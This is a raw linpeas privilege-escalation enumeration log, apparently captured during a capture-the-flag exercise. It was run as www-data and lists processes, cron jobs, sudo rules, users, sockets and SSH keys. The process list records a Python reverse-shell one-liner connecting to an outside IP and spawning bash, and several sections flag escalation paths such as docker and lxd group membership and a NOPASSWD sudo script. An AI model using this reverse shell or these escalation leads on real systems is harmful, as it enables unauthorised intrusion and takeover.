www-data  5583  0.0  0.0   5356   888 pts/2    S+   08:05   0:00  |                   _ /bin/sh ./linpeas.sh
www-data  5587  0.0  0.1  36840  3272 pts/2    R+   08:05   0:00  |                   |   _ ps fauxwww
www-data  5586  0.0  0.0   5356   888 pts/2    S+   08:05   0:00  |                   _ /bin/sh ./linpeas.sh
www-data  1090  0.0  0.6 338576 13132 ?        S    07:31   0:00  _ /usr/sbin/apache2 -k start
www-data  2124  0.0  0.0   4628   812 ?        S    07:51   0:00  |   _ sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.23.136",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
www-data  2125  0.0  0.5  38516 10612 ?        S    07:51   0:00  |       _ python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.23.136",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
www-data  2126  0.0  0.1  18508  3248 pts/0    Ss   07:51   0:00  |           _ bash
root      2129  0.0  0.1  60576  3684 pts/0    S+   07:51   0:00  |               _ sudo .helpline.sh
www-data  1663  0.0  0.6 338576 13124 ?        S    07:31   0:00  _ /usr/sbin/apache2 -k start
www-data  2135  0.0  0.4 338140  9212 ?        S    07:52   0:00  _ /usr/sbin/apache2 -k start
www-data  2150  0.0  0.4 338140  9212 ?        S    08:02   0:00  _ /usr/sbin/apache2 -k start
mysql     1232  0.0  8.6 1162116 177348 ?      Sl   07:31   0:00 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
root      1314  0.0  3.9 754444 80204 ?        Ssl  07:31   0:00 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                                                                                          
COMMAND    PID  TID             USER   FD      TYPE DEVICE SIZE/OFF    NODE NAME                                                                                                                                                            

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                                                                                                          
gdm-password Not Found                                                                                                                                                                                                                      
gnome-keyring-daemon Not Found                                                                                                                                                                                                              
lightdm Not Found                                                                                                                                                                                                                           
vsftpd process found (dump creds from memory as root)                                                                                                                                                                                       
apache2 process found (dump creds from memory as root)
sshd Not Found
                                                                                                                                                                                                                                            
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                                                                                      
/usr/bin/crontab                                                                                                                                                                                                                            
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab                                                                                                                                                                                    

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Oct  3  2020 .
drwxr-xr-x 98 root root 4096 Oct  5  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  589 Jan 14  2020 mdadm
-rw-r--r--  1 root root  712 Jan 17  2018 php
-rw-r--r--  1 root root  191 Aug  6  2020 popularity-contest

/etc/cron.daily:
total 64
drwxr-xr-x  2 root root 4096 Oct  3  2020 .
drwxr-xr-x 98 root root 4096 Oct  5  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x  1 root root  376 Nov 11  2019 apport
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  539 Jan 14  2020 mdadm
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x  1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Aug  6  2020 .
drwxr-xr-x 98 root root 4096 Oct  5  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Aug  6  2020 .
drwxr-xr-x 98 root root 4096 Oct  5  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Aug  6  2020 .
drwxr-xr-x 98 root root 4096 Oct  5  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  211 Nov 12  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                                                                                                              
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                                                                                                                                                 

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                                                                                                 
You can't write on systemd PATH                                                                                                                                                                                                             

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                                                                                   
NEXT                         LEFT          LAST                         PASSED    UNIT                         ACTIVATES                                                                                                                    
Thu 2022-11-03 08:09:00 UTC  3min 30s left Thu 2022-11-03 07:39:01 UTC  26min ago phpsessionclean.timer        phpsessionclean.service
Thu 2022-11-03 19:52:41 UTC  11h left      Thu 2022-11-03 07:31:06 UTC  34min ago apt-daily.timer              apt-daily.service
Thu 2022-11-03 20:26:54 UTC  12h left      Thu 2022-11-03 07:31:06 UTC  34min ago motd-news.timer              motd-news.service
Fri 2022-11-04 06:03:50 UTC  21h left      Thu 2022-11-03 07:31:06 UTC  34min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Fri 2022-11-04 07:45:49 UTC  23h left      Thu 2022-11-03 07:45:49 UTC  19min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2022-11-07 00:00:00 UTC  3 days left   Thu 2022-11-03 07:31:06 UTC  34min ago fstrim.timer                 fstrim.service
n/a                          n/a           n/a                          n/a       snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a           n/a                          n/a       ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                                                                                   
                                                                                                                                                                                                                                            
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                                                                  
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request                                                                                                                                 
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                                                                  
/run/acpid.socket                                                                                                                                                                                                                           
  └─(Read Write)
/run/containerd/containerd.sock
/run/containerd/containerd.sock.ttrpc
/run/dbus/system_bus_socket
  └─(Read Write)
/run/docker.sock
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/var/lib/lxd/unix.socket
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/docker.sock
/var/run/docker/libnetwork/020eb7ca13a6.sock
/var/run/docker/metrics.sock
/var/run/mysqld/mysqld.sock
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                                                                                    
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)                                                                                                                                      
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                                                                                    
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION                                                                                                    
:1.0                                 775 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
:1.1                                 789 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
:1.2                                   1 systemd         root             :1.2          init.scope                -          -                  
:1.28                               8660 busctl          www-data         :1.28         apache2.service           -          -                  
:1.3                                 954 accounts-daemon[0m root             :1.3          accounts-daemon.service   -          -                  
:1.4                                 983 systemd-logind  root             :1.4          systemd-logind.service    -          -                  
:1.5                                1024 polkitd         root             :1.5          polkit.service            -          -                  
:1.8                                 928 networkd-dispat root             :1.8          networkd-dispatcher.se…ce -          -                  
:1.9                                1014 unattended-upgr root             :1.9          unattended-upgrades.se…ce -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
io.netplan.Netplan                     - -               -                (activatable) -                         -         
org.freedesktop.Accounts             954 accounts-daemon[0m root             :1.3          accounts-daemon.service   -          -                  
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
org.freedesktop.PolicyKit1          1024 polkitd         root             :1.5          polkit.service            -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               983 systemd-logind  root             :1.4          systemd-logind.service    -          -                  
org.freedesktop.network1             775 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
org.freedesktop.resolve1             789 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
org.freedesktop.systemd1               1 systemd         root             :1.2          init.scope                -          -                  
org.freedesktop.thermald               - -               -                (activatable) -                         -         
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                                                                                                         
                              ╚═════════════════════╝                                                                                                                                                                                       
╔══════════╣ Hostname, hosts and DNS
ubuntu                                                                                                                                                                                                                                      
127.0.0.1 localhost
127.0.1.1 ubuntu

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0
search eu-west-1.compute.internal

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                                                                                         
link-local 169.254.0.0
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:b7:c3:81:aa  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.65.56  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::87:30ff:fe1d:4629  prefixlen 64  scopeid 0x20<link>
        ether 02:87:30:1d:46:29  txqueuelen 1000  (Ethernet)
        RX packets 2239  bytes 982397 (982.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1722  bytes 1033259 (1.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 168  bytes 14849 (14.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 168  bytes 14849 (14.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                               
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                            


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                                                                                                                                    
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                                                                                                       

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
Matching Defaults entries for www-data on ubuntu:                                                                                                                                                                                           
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                                                                                                                      
ptrace protection is enabled (1)                                                                                                                                                                                                            
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                                                                                  
                                                                                                                                                                                                                                            
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                             

╔══════════╣ Users with console
anurodh:x:1002:1002:,,,:/home/anurodh:/bin/bash                                                                                                                                                                                             
apaar:x:1001:1001:,,,:/home/apaar:/bin/bash
aurick:x:1000:1000:Anurodh:/home/aurick:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                                                                      
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1000(aurick) gid=1000(aurick) groups=1000(aurick),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
uid=1002(manurodh) gid=1002(manurodh) groups=1002(manurodh),999(docker)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(mysql) gid=114(mysql) groups=114(mysql)
uid=112(ftp) gid=115(ftp) groups=115(ftp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 08:05:32 up 34 min,  0 users,  load average: 0.51, 0.13, 0.04                                                                                                                                                                              
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
root     tty1         Sat Oct  3 06:40:58 2020 - crash                    (1+00:34)    0.0.0.0                                                                                                                                              
reboot   system boot  Sat Oct  3 06:40:29 2020 - Mon Oct  5 14:19:00 2020 (2+07:38)    0.0.0.0
apaar    pts/1        Sat Oct  3 05:41:00 2020 - Sat Oct  3 06:10:12 2020  (00:29)     192.168.184.129
apaar    pts/3        Sat Oct  3 05:21:47 2020 - Sat Oct  3 05:25:19 2020  (00:03)     192.168.184.129
apaar    pts/3        Sat Oct  3 05:20:54 2020 - Sat Oct  3 05:20:57 2020  (00:00)     192.168.184.129
aurick   pts/0        Sat Oct  3 03:43:28 2020 - crash                     (02:57)     192.168.184.129
aurick   tty1         Sat Oct  3 03:41:01 2020 - Sat Oct  3 05:33:02 2020  (01:52)     0.0.0.0
reboot   system boot  Sat Oct  3 03:40:02 2020 - Mon Oct  5 14:19:00 2020 (2+10:38)    0.0.0.0

wtmp begins Sat Oct  3 03:40:02 2020

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                                                                                                           
root             tty1                      Sun Oct  4 13:13:35 +0000 2020
aurick           pts/0    192.168.184.129  Sat Oct  3 03:43:28 +0000 2020
apaar            pts/2    192.168.184.129  Sun Oct  4 14:05:57 +0000 2020

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
                                                                                                                                                                                                                                            
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                                                                                            


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                                                                                                          
                             ╚══════════════════════╝                                                                                                                                                                                       
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                                                                                             
/usr/bin/ctr
/usr/bin/curl
/usr/bin/docker
/usr/bin/lxc
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/runc
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
/usr/share/gcc-8                                                                                                                                                                                                                            

╔══════════╣ MySQL version
mysql  Ver 14.14 Distrib 5.7.31, for Linux (x86_64) using  EditLine wrapper                                                                                                                                                                 


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No                                                                                                                                                                                  
═╣ MySQL connection using root/NOPASS ................. No                                                                                                                                                                                  
                                                                                                                                                                                                                                            
╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql                                                                                                                                                             
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)
                                                                                                                                                                                                                                            
-rw------- 1 root root 317 Oct  3  2020 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.29 (Ubuntu)                                                                                                                                                                                      
Server built:   2020-08-12T21:33:25
httpd Not Found
                                                                                                                                                                                                                                            
Nginx version: nginx Not Found
                                                                                                                                                                                                                                            
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Oct  3  2020 /etc/apache2/sites-enabled                                                                                                                                                                         
drwxr-xr-x 2 root root 4096 Oct  3  2020 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Oct  3  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:9001>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/files
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 2783 Oct  3  2020 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:9001>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/files
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Oct  3  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:9001>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/files
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 71817 May 26  2020 /etc/php/7.2/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 71429 May 26  2020 /etc/php/7.2/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                                                          
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                                                                                        
drwxr-xr-x 2 root root 4096 Aug  6  2020 /etc/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                                                                                                 
                                                                                                                                                                                                                                            



-rw-r--r-- 1 apaar apaar 565 Oct  3  2020 /home/apaar/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3BzOCWTm3aFsN/RKd4n4tBT71A+vJYONyyrDDj59Pv8lnVTtxi1/VI2Nb/op1nHUcuz1tYMJDMew2kkb+5CX6uiYfnryzD4OQoQUhC4tMSmopIoAi322Y5QSzSY1mSBESddCsn0C5VgE9in4PFl3rFv/k05hJDTXewmCh06vN7OAT5CLbf9lTtf1/Ga40pRixYFlV5owqZci697h17Is1K7RSFCQZwLGl29pLHPBwOpXkHpJqNqEl6Wgu+y0jvauNKzgIypD0EyojgX+1OPogSEr8WNuOc8w6wqQm6gTaAayPioIATTD/ECDBMJPLYN71t6Wdi5E+7R2GT6BIRFiGhTG65KXwXj6Vn7bj99BLSlaq2Qk6oUYpxhhkaE5koPKCJHb9zBsrGEUHTOMFjKhCypQCtjG9noW2jzm+/beqKcEZINQEQfzQFIGKdH0ypGfCCvD6YFUg7lcqQQH5Zd+9a95/5WyUE0XkNzJzU/yxfQ8RDB2In/ZptDYNBFoHXfM= root@ubuntu

ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem                                                                                                                                                                                                       
2162PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                                                                                                                              
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                                                                                            


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Oct  3  2020 /etc/pam.d                                                                                                                                                                                         
-rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions                                                                                                                                                      
tmux 2.6                                                                                                                                                                                                                                    


/tmp/tmux-33
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3517 Jun  3  2020 /etc/cloud/cloud.cfg                                                                                                                                                                               
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Aug  6  2020 /usr/share/keyrings                                                                                                                                                                                




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                                                                                              
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                                                                                                
gpg Not Found
netpgpkeys Not Found                                                                                                                                                                                                                        
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
-rw-r--r-- 1 root root 2760 Oct  3  2020 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 2796 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 3267 Sep 17  2020 /usr/share/gnupg/distsigkey.gpg
